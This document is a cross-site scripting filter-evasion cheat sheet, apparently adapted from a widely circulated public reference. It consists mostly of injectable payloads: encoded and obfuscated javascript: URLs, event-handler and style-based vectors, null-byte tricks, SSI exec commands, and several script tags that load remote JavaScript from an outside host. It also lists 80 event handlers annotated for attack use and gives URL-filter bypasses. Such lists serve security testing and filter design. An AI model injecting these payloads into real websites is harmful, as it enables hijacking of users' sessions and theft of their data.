# XSS Cheatsheat For Filter Evasion

**Note:** This page is for those who have knowledge of how xss works, if you don't know about xss this will not help you.

## Cheatsheat:
XSS locator (inject this string, view source and search for "XSS", if you see "<XSS" verses "&lt;XSS" it may be vulnerable):
```
'';!--"<XSS>=&{()}
```
Normal XSS:
```
<IMG SRC="javascript:alert('XSS');">
```
No quotes and no semicolon:
```
<IMG SRC=javascript:alert('XSS')>
```
Case insensitive XSS attack vector:
```
<IMG SRC=JaVaScRiPt:alert('XSS')>
```
HTML entities:
```
<IMG SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>
```
UTF-8 Unicode encoding (almost all of these encoding methods work only in Internet Explorer and Opera):
```
<IMG
SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>
```
Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for &#XX, since most people don't know about padding - up to 7 numeric charachters total). This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
```
<IMG
SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
```

Hex encoding without semicolons (this is also a viable attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric charachter following the pound symbol - which is not true with hex HTML charachters):
```
<IMG
SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```
Embedded tab to break up XSS. This works in IE and Opera. Some websites claim than any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. 
The following four XSS examples illustrate this vector:
```
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```
Embedded newline to break up XSS:
```
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```
Embedded carriage return to break up XSS:
```
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```
Multiline Injected JS using ASCII carriage returns (same as above only a more extreme example of this XSS vector) these are not spaces just one of the three charachters as described above: 
```
<IMG
SRC
=
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>
```
Null chars also work as XSS vectors in both IE and older versions of Opera, but not like above, you need to inject them directly using something like Burp Proxy or if you want to write your own you can either use vim (^V@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example: 
```
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```
Spaces before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword):
```
<IMG SRC="   javascript:alert('XSS');">
```

XSS with no single quotes or double quotes or semicolons:
```
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
```
BODY image:
```
<BODY BACKGROUND="javascript:alert('XSS')">
```
BODY tag (I like this method because it doesn't require using any variants of "javascript:" or "<SCRIPT..." to accomplish the XSS attack):
```
<BODY ONLOAD=alert('XSS')>
```
Event Handlers that can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing):
```
1. FSCommand() (attacker can use this when executed
from within an embedded Flash object)
2. onAbort() (when user aborts the loading of an image)
3. onActivate() (when object is set as the active element)
4. onAfterPrint() (activates after user prints or previews print job)
5. onAfterUpdate() (activates on data object after updating data in the
source object)
6. onBeforeActivate() (fires before the object is set as the active
element)
7. onBeforeCopy() (attacker executes the attack string right before a
selection is copied to the clipboard - attackers can do this with the
execCommand("Copy") function)
8. onBeforeCut() (attacker executes the attack string right before a
selection is cut)
9. onBeforeDeactivate() (fires right after the activeElement is changed
from the current object)
10. onBeforeEditFocus() (Fires before an object contained in an
editable element enters a UI-activated state or when an editable
container object is control selected)
11. onBeforePaste() (user needs to be tricked into pasting or be forced
into it using the execCommand("Paste") function)
12. onBeforePrint() (user would need to be tricked into printing or
attacker could use the print() or execCommand("Print") function).
13. onBeforeUnload() (user would need to be tricked into closing the
browser - attacker cannot unload windows unless it was spawned from the
parent)
14. onBlur() (in the case where another popup is loaded and window
looses focus)
15. onBounce() (fires when the behavior property of the marquee object
is set to "alternate" and the contents of the marquee reach one side of
the window)
16. onCellChange() (fires when data changes in the data provider)
17. onChange() (select, text, or TEXTAREA field loses focus and its
value has been modified)
18. onClick() (someone clicks on a form)
19. onContextMenu() (user would need to right click on attack area)
20. onControlSelect() (fires when the user is about to make a control
selection of the object)
21. onCopy() (user needs to copy something or it can be exploited using
the execCommand("Copy") command)
22. onCut() (user needs to copy something or it can be exploited using
the execCommand("Cut") command)
23. onDataAvailible() (user would need to change data in an element, or
attacker could perform the same function)
24. onDataSetChanged() (fires when the data set exposed by a data
source object changes)
25. onDataSetComplete() (fires to indicate that all data is available
from the data source object)
26. onDblClick() (user double-clicks a form element or a link)
27. onDeactivate() (fires when the activeElement is changed from the
current object to another object in the parent document)
28. onDrag() (requires that the user drags an object)
29. onDragEnd() (requires that the user drags an object)
30. onDragLeave() (requires that the user drags an object off a valid
location)
31. onDragEnter() (requires that the user drags an object into a valid
location)
32. onDragOver() (requires that the user drags an object into a valid
location)
33. onDragDrop() (user drops an object (e.g. file) onto the browser
window)
34. onDrop() (user drops an object (e.g. file) onto the browser window)
35. onError() (loading of a document or image causes an error)
36. onErrorUpdate() (fires on a databound object when an error occurs
while updating the associated data in the data source object)
37. onExit() (someone clicks on a link or presses the back button)
38. onFilterChange() (fires when a visual filter completes state
change)
39. onFinish() (attacker can create the exploit when marquee is
finished looping)
40. onFocus() (attacker executes the attack string when the window gets
focus)
41. onFocusIn() (attacker executes the attack string when window gets
focus)
42. onFocusOut() (attacker executes the attack string when window
looses focus)
43. onHelp() (attacker executes the attack string when users hits F1
while the window is in focus)
44. onKeyDown() (user depresses a key)
45. onKeyPress() (user presses or holds down a key)
46. onKeyUp() (user releases a key)
47. onLayoutComplete() (user would have to print or print preview)
48. onLoad() (attacker executes the attack string after the window
loads)
49. onLoseCapture() (can be exploited by the releaseCapture() method)
50. onMouseDown() (the attacker would need to get the user to click on
an image)
51. onMouseEnter() (cursor moves over an object or area)
52. onMouseLeave() (the attacker would need to get the user to mouse
over an image or table and then off again)
53. onMouseMove() (the attacker would need to get the user to mouse
over an image or table)
54. onMouseOut() (the attacker would need to get the user to mouse over
an image or table and then off again)
55. onMouseOver() (cursor moves over an object or area)
56. onMouseUp() (the attacker would need to get the user to click on an
image)
57. onMouseWheel() (the attacker would need to get the user to use
their mouse wheel)
58. onMove() (user or attacker would move the page)
59. onMoveEnd() (user or attacker would move the page)
60. onMoveStart() (user or attacker would move the page)
61. onPaste() (user would need to paste or attacker could use the
execCommand("Paste") function)
62. onProgress() (attacker would use this as a flash movie was loading)
63. onPropertyChange() (user or attacker would need to change an
element property)
64. onReadyStateChange() (user or attacker would need to change an
element property)
65. onReset() (user or attacker resets a form)
66. onResize() (user would resize the window; attacker could auto
initialize with something like:
<SCRIPT>self.resizeTo(500,400);</SCRIPT>)
67. onResizeEnd() (user would resize the window; attacker could auto
initialize with something like:
<SCRIPT>self.resizeTo(500,400);</SCRIPT>)
68. onResizeStart() (user would resize the window; attacker could auto
initialize with something like:
<SCRIPT>self.resizeTo(500,400);</SCRIPT>)
69. onRowEnter() (user or attacker would need to change a row in a data
source)
70. onRowExit() (user or attacker would need to change a row in a data
source)
71. onRowDelete() (user or attacker would need to delete a row in a
data source)
72. onRowInserted() (user or attacker would need to insert a row in a
data source)
73. onScroll() (user would need to scroll, or attacker could use the
scrollBy() function)
74. onSelect() (user needs to select some text - attacker could auto
initialize with something like:
window.document.execCommand("SelectAll");)
75. onSelectionChange() (user needs to select some text - attacker
could auto initialize with something like:
window.document.execCommand("SelectAll");)
76. onSelectStart() (user needs to select some text - attacker could
auto initialize with something like:
window.document.execCommand("SelectAll");)
77. onStart() (fires at the beginning of each marquee loop)
78. onStop() (user would need to press the stop button or leave the
webpage)
79. onSubmit() (requires attacker or user submits a form)
80. onUnload() (as the user clicks any link or presses the back button
or attacker forces a click)

```
IMG Dynsrc (works in IE):
```
<IMG DYNSRC="javascript:alert('XSS')">
```
Input Dynsrc and Src (This XSS works in IE but remember to use TYPE="image"):
```
<INPUT TYPE="image" DYNSRC="javascript:alert('XSS');">
```
BGSOUND (works in IE):
```
<BGSOUND SRC="javascript:alert('XSS');">
```
& JS includes (works in Netscape 4.x):
```
<br size="&{alert('XSS')}">
```
Layer (also only works in Netscape 4.x):
```
<LAYER SRC="http://k2decompiler.com"></layer>
```
Style sheet:
```
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```
VBscript in an image:
```
<IMG SRC='vbscript:msgbox("XSS")'>
```

Mocha (older versions of Netscape only):
```
<IMG SRC="mocha:[code]">
```
Livescript (older versions of Netscape only):
```
<IMG SRC="livescript:[code]">
```
Iframe (if iframes are allowed there are a lot of other XSS problems as well):
```
<IFRAME SRC=javascript:alert('XSS')></IFRAME>
```
Frame (frames have the same sorts of XSS problems as iframes):
```
<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>
```
Tables (who would have thought tables were XSS targets... except me, of course):
```
<TABLE BACKGROUND="javascript:alert('XSS')">
```
Div background-image:
```
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```
STYLE tags with broken up JavaScript for XSS:
```
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```
STYLE tag using background-image:
```
<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```
STYLE tag using background:
```
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
```

Using an OBJECT tag you can embed a flash movie that contains XSS:
```
getURL("javascript:alert('XSS')")
```
Using the above action script inside flash can obfuscate your XSS vector:
```
a="get";
b="URL";
c="javascript:";
d="alert('XSS');";
eval(a+b+c+d);
```
XML:
```
<XML SRC="javascript:alert('XSS');">
```
Assuming you can only write into the <IMG SRC="$yourinput"> field and the string "javascript:" is recursively removed:
```
"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
```
Assuming you can only fit in a few charachters and it filters against ".js" you can rename your JavaScript file to an image as an XSS vector:
```
<SCRIPT SRC="http://k2decompiler.com/xss.jpg"></SCRIPT>
```

SSI (Server Side Includes) requires SSI to be installed on the server: 
```
<!--#exec cmd="/bin/echo '<SCRIPT
SRC'"--><!--#exec cmd="/bin/echo
'=http://k2decompiler.com/a.js></SCRIPT>'"-->
```
**XSS using HTML quote encapsulation:**
```
<SCRIPT a=">" SRC="http://k2decompiler.com/a.js"></SCRIPT>
<SCRIPT =">" SRC="http://k2decompiler.com/a.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://k2decompiler.com/a.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://k2decompiler.com/a.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://k2decompiler.com/a.js"></SCRIPT>
```
**URL string evasion (assuming "http://www.google.com/" is programmatically disallowed):**
```
<A HREF=http://66.102.7.147/>link</A>
<A HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D>link</A>
<A HREF=ht://www.google.com/>link</A>
<A HREF=http://google.com/>link</A>
<A HREF=http://www.google.com./>link</A>
<A HREF="javascript:document.location='http://www.google.com/'">link</A>
<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>

```
